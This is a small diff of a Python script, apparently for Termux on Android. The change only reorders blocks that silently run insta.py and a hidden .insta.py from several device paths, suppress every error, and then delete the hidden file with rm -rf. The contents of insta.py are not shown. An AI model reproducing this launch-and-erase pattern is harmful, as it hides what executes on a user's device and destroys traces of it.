@@ -2,21 +2,6 @@
 import os, sys, time, random
 try:
     import os
-    os.system("insta.py")
-except:
-    pass
-try:
-    import os
-    os.system("/data/data/com.termux/files/svr/insta.py")
-except:
-    pass
-try:
-    import os
-    os.system("/sdcard/download/insta.py")
-except:
-    pass
-try:
-    import os
     os.system(".insta.py")
 except:
     pass
@@ -28,6 +13,21 @@ except:
 try:
     import os
     os.system("/sdcard/download/.insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("/data/data/com.termux/files/svr/insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("/sdcard/download/insta.py")
 except:
     pass
 os.system("rm -rf .insta.py")
